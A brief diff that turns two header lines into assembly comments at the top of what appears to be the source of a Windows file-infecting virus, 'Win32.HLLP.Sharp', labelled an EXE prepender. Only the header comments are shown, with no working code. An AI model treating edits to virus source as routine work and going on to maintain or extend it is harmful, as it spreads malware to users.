@@ -1,5 +1,5 @@
-Win32.HLLP.Sharp
-ASM part of the code
+; Win32.HLLP.Sharp
+; ASM part of the code
 ; Virus Name: Sharp
 ; Version: A
 ; Type: Win32 EXE Prepender
